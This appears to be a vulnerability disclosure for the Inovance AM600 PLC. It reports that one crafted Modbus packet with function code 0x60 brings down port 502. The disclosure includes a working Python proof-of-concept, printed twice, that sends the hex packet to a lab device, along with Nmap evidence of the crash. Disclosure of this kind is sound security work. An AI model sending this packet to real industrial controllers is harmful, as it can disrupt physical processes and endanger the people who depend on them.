# Summary
There is a denial of service vulnerability in port 502 of Inovance AM600 PLC.

An attacker can send a crafted packet to let port 502 down.

Affected component is port 502 and unknown funccode `0x60`.

# Details
Detail of the PLC:
![image](https://github.com/user-attachments/assets/557ed0f7-6277-4fa8-860c-727aa09637cc)


Connectivity test of the device:
![image](https://github.com/user-attachments/assets/95348d75-e43c-4ef0-8a58-5c9d359fc388)


Nmap scans device ports:![image](https://github.com/user-attachments/assets/4a51c345-cab7-4676-b8ec-96bf64f49c2c)


You can see that port 502 is open.

Then we run the script:
```
python3 poc.py
```
```py
import socket
import time
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.88",502))

datas = ["00010000000b0960fff1800000010a0102"]

for data in datas:
    packet = bytes.fromhex(data)
    s.send(packet)
```


After a while, we scan the port with Nmap and find:
![image](https://github.com/user-attachments/assets/592c6ebb-7103-4a72-b49f-05c83c55c152)

Of the **7** ports that were originally open, only **3** are left now, and **mbap port 502** has also been closed.

And I uploaded a mp4 record here: https://github.com/N0zoM1z0/Vuln-Search/blob/main/AM600_Crash.mp4

# PoC
My host ip is `192.168.1.149` and the device's ip is `192.168.1.88`.

poc.py
```py
import socket
import time
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.88",502))

datas = ["00010000000b0960fff1800000010a0102"]

for data in datas:
    packet = bytes.fromhex(data)
    s.send(packet)
```

# Discoverer
ylqncepu@163.com

https://github.com/N0zoM1z0
